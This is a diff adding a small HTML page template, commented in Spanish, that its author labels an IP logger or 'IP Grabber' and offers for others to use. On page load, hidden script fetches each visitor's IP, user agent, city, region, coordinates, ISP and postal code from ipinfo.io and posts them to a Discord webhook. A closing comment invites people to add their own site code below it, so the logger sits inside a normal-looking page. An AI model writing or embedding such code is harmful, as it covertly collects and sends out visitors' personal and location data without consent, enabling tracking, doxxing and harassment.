@@ -1,0 +1,52 @@
+<!-- Codigo Creado en 2022 subido en 2025 -->
+<!-- Autor Oficial @seseintaynueveak -->
+<!-- Script IP Logger para registro web -->
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Titulo de la web</title>
+    <link type="text/css" rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script>
+        $.get("https://ipinfo.io", function(response) {
+            const webhook_url = "DISCORD WEBHOOK URL";
+            const main = {
+                title: "Nombre del ip logger",
+                description: "Descripcion del ip logger",
+                thumbnail: {
+                    url: "Icono Webhook discord",
+                },
+                fields: [
+                    { name: "IP:", value: `${response.ip}`, inline: false },
+                    { name: "User-Agent:", value: `${navigator.userAgent}`, inline: false },
+                    { name: "Ciudad:", value: `${response.city}`, inline: false },
+                    { name: "Region:", value: `${response.region}`, inline: false },
+                    { name: "País:", value: `${response.country}`, inline: false },
+                    { name: "Localización:", value: `${response.loc}`, inline: false },
+                    { name: "Compañia:", value: `${response.org}`, inline: false },
+                    { name: "Código postal:", value: `${response.postal}`, inline: false },
+                ],
+                footer: { text: "IP Grabber" },
+                author: { name: "@seseintaynueveak", url: "Link de tu servidor de discord" }
+            };
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", webhook_url, true);
+            xhttp.setRequestHeader('Content-Type', 'application/json');
+            xhttp.send(JSON.stringify({
+                'username': 'Ip Grabber',
+                'embeds': [main],
+            }));
+        }, "json");
+    </script>
+</head>
+<body>
+    <!-- Arreglo 20 / 09 / 2025 -->
+    <div id="here"></div>
+    <script>
+        const date = new Date();
+        document.getElementById('here').innerHTML = date;
+    </script>
+</body>
+</html>
+
+<!-- A continuacion de este comentario poner vuestro codigo de vuestra web-->
